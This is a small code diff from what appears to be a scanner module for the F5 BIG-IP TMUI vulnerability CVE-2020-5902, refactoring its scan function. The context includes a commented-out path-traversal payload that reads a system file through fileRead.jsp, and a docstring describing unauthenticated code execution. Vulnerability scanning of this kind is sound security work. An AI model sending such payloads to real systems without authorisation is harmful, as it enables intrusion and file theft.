@@ -14,7 +14,7 @@ cve_2020_5902_payloads = [
     # {'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:/Windows/System32/drivers/etc/hosts'}
 ]
 
-def cve_2020_5902_scan(self, clients):
+def cve_2020_5902_scan(clients):
     ''' F5-BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞;
         未授权的远程攻击者通过向该页面发送特制的请求包, 可以造成任意Java 代码执行;
         进而控制 F5 BIG-IP 的全部功能, 包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等
@@ -22,7 +22,7 @@ def cve_2020_5902_scan(self, clients):
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'F5-BIG-IP',
         'vul_type': 'RCE/FileRead',
         'vul_id': 'CVE-2020-5902',
     }
